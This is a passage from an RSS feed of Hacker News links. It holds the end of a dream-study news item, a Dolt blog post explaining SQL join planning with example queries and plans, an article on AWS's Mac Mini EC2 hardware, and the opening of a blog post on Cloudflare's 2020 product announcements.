<p><strong>Study:</strong> “<a href="https://www.sciencedirect.com/science/article/abs/pii/S1053810020305389?via%3Dihub" target="_blank" rel="noreferrer noopener">Dreams reflect nocturnal cognitive processes: Early-night dreams are more continuous with waking life, and late-night dreams are more emotional and hyperassociative</a>“<br><strong>Authors:</strong> J.E. Malinowski and C.L. Horton<br><strong>Published in: </strong><em><a href="https://www.journals.elsevier.com/consciousness-and-cognition/" target="_blank" rel="noreferrer noopener">Consciousness and Cognition</a></em><br><strong>Publication date: </strong>December 25, 2020<br><strong>DOI:</strong> <a href="https://doi.org/10.1016/j.concog.2020.103071" target="_blank" rel="noreferrer noopener">https://doi.org/10.1016/j.concog.2020.103071<br></a><strong>Image: </strong>by&nbsp;<a href="https://pixabay.com/users/4144132-4144132/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1959110">4144132</a>&nbsp;via&nbsp;<a href="https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1959110">Pixabay</a>&nbsp;</p>
<p>For a weekly summary of the latest psychology research and psychology news, subscribe to our <a href="https://psychnewsweekly.substack.com/p/coming-soon?r=3s6yi&amp;utm_campaign=post&amp;utm_medium=email&amp;utm_source=copy" target="_blank" rel="noreferrer noopener">Psych News Weekly newsletter</a>.</p>
</div>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://www.psychnewsdaily.com/study-finds-that-we-have-more-weird-dreams-as-the-night-progresses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561331</guid>
            <pubDate>Mon, 28 Dec 2020 17:54:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing join planning in our open source Golang SQL query engine]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25561173">thread link</a>) | @zachmu
<br/>
December 28, 2020 | https://www.dolthub.com/blog/2020-12-28-join-planning/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-12-28-join-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span>
<span>+</span>
<span>|</span> <span>plan</span>                                                        <span>|</span>
<span>+</span>
<span>|</span> IndexedJoin<span>(</span>p<span>.</span>city <span>=</span> c<span>.</span>name<span>)</span>                                <span>|</span>
<span>|</span>  ├─ Filter<span>(</span>p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>)</span>                           <span>|</span>
<span>|</span>  │   └─ Projected <span>table</span> access <span>on</span> <span>[</span>name city<span>]</span>               <span>|</span>
<span>|</span>  │       └─ TableAlias<span>(</span>p<span>)</span>                                   <span>|</span>
<span>|</span>  │           └─ Indexed <span>table</span> access <span>on</span> <span>index</span> <span>[</span>people<span>.</span>name<span>]</span> <span>|</span>
<span>|</span>  │               └─ Exchange<span>(</span>parallelism<span>=</span><span>16</span><span>)</span>                <span>|</span>
<span>|</span>  │                   └─ <span>Table</span><span>(</span>people<span>)</span>                       <span>|</span>
<span>|</span>  └─ IndexedJoin<span>(</span>s<span>.</span>name <span>=</span> c<span>.</span>state<span>)</span>                           <span>|</span>
<span>|</span>      ├─ TableAlias<span>(</span>c<span>)</span>                                       <span>|</span>
<span>|</span>      │   └─ IndexedTableAccess<span>(</span>cities <span>on</span> <span>[</span>cities<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>|</span>      └─ TableAlias<span>(</span>s<span>)</span>                                       <span>|</span>
<span>|</span>          └─ IndexedTableAccess<span>(</span>states <span>on</span> <span>[</span>states<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>
<table>
<thead>
<tr>
<th>Join plan</th>
<th>Number of rows accessed</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cross join</td>
<td>343 * 10^12</td>
</tr>
<tr>
<td>Cross join with pushdown</td>
<td>50 * 10^9</td>
</tr>
<tr>
<td>Pushdown and indexed access</td>
<td>144 * 10^3</td>
</tr>
</tbody>
</table>
<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="two table join" title="two table join" src="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" srcset="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/a48b3/simple-join.png 214w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/47730/simple-join.png 428w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png 441w" sizes="(max-width: 441px) 100vw, 441px" loading="lazy">
  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="three table join" title="three table join" src="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" srcset="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/a48b3/three-table-join.png 214w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/47730/three-table-join.png 428w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png 578w" sizes="(max-width: 578px) 100vw, 578px" loading="lazy">
  </a>
    </span></p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c <span>join</span> D <span>on</span> c <span>=</span> d<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="four table join" title="four table join" src="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" srcset="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/a48b3/four-table-join.png 214w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/47730/four-table-join.png 428w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png 721w" sizes="(max-width: 721px) 100vw, 721px" loading="lazy">
  </a>
    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png 856w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png 904w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png 717w" sizes="(max-width: 717px) 100vw, 717px" loading="lazy">
  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="invalid three table join" title="invalid three table join" src="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" srcset="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/a48b3/three-table-invalid.png 214w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/47730/three-table-invalid.png 428w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png 577w" sizes="(max-width: 577px) 100vw, 577px" loading="lazy">
  </a></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dolthub.com/blog/2020-12-28-join-planning/">https://www.dolthub.com/blog/2020-12-28-join-planning/</a></em></p>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-12-28-join-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561173</guid>
            <pubDate>Mon, 28 Dec 2020 17:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How AWS Added Apple Mac Mini Nodes to EC2]]>
            </title>
            <description>
<![CDATA[
Score 193 | Comments 211 (<a href="https://news.ycombinator.com/item?id=25561127">thread link</a>) | @tambourine_man
<br/>
December 28, 2020 | https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg" data-caption="AWS EC2 Apple Mac Mini Node In Rack Cover"><img width="696" height="449" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-400x258.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-651x420.jpg 651w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="AWS EC2 Apple Mac Mini Node In Rack Cover" title="AWS EC2 Apple Mac Mini Node In Rack Cover"></a><figcaption>AWS EC2 Apple Mac Mini Node In Rack Cover</figcaption></figure></div>
            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>
<figure id="attachment_49659" aria-describedby="caption-attachment-49659"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-nitro-to-nitro4/" rel="attachment wp-att-49659"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg" alt="AWS Nitro To Nitro4" width="2560" height="688" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg 2560w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-400x107.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-800x215.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1536x413.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-2048x550.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-696x187.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1068x287.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1564x420.jpg 1564w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-49659">AWS Nitro To Nitro4</figcaption></figure>
<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>
<p><iframe title="What is a DPU - A Quick STH Primer to the New Processor" width="696" height="392" src="https://www.youtube.com/embed/S92rdAwIuNk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>
<figure id="attachment_49660" aria-describedby="caption-attachment-49660"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack-nitro-controller-highlighted/" rel="attachment wp-att-49660"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted" width="1355" height="609" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg 1355w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-400x180.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-800x360.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-696x313.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-1068x480.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-934x420.jpg 934w" sizes="(max-width: 1355px) 100vw, 1355px"></a><figcaption id="caption-attachment-49660">AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted</figcaption></figure>
<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561127</guid>
            <pubDate>Mon, 28 Dec 2020 17:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flare Ups: It's Been a Busy 2020 for Cloudflare]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560918">thread link</a>) | @StriverGuy
<br/>
December 28, 2020 | https://hhhypergrowth.com/flare-ups/ | <a href="https://web.archive.org/web/*/https://hhhypergrowth.com/flare-ups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>It has been a busy 2020 for Cloudflare. This company is my 2nd highest position (right behind CrowdStrike) as it sits at the nexus of two of the next-gen enterprise technology waves that I follow closely - <strong><a href="https://hhhypergrowth.com/tag/edge-networks/">Edge Networks</a></strong> and<strong> <a href="https://hhhypergrowth.com/tag/cybersecurity/">Zero Trust</a></strong>. Over the second half of 2020, it has had 4 different announcement weeks: Serverless Week, Birthday Week, Zero Trust Week, and Privacy &amp; Compliance Week. They are continually moving forward at an incredibly rapid pace, and while these announcement weeks are great for seeing the product innovations, it also gives us outsiders a view into <strong>how these moves fit into the larger picture</strong>. </p><p>And whoooo-boy... were there a lot of announcements. So many that it may look like they are moving in too many directions, or seem scattered or are stretching themselves thin. But no - <em>every</em> advance Cloudflare makes is improving either their core platform (web protection and performance), or one of the key directions I am watching them move more fully into. Instead of going one-by-one through the new products and features, let's instead look at what Cloudflare had before, the key platform areas that I am watching as an investor, and how those areas advanced. </p><p>I'm going to be referencing their prior products heavily. Pop quiz: What is Magic Transit, Argo, WARP? You need to know... so let's recap their product lines &amp; features stood (at the start of summer) before we explore the new enhancements.</p><hr><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_logo.png 600w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png 874w" sizes="(min-width: 720px) 720px"></figure><p>This is mostly a recap from my <a href="https://hhhypergrowth.com/a-cloudflare-deep-dive/">first deep dive back in February 2020</a>, with a couple of additions and clarifications.</p><h2 id="core-platform">Core platform</h2><p>Cloudflare is an edge network, currently with 51Tb+ of global network capacity that is interconnecting with nearly 9000 outside networks (ISPs, 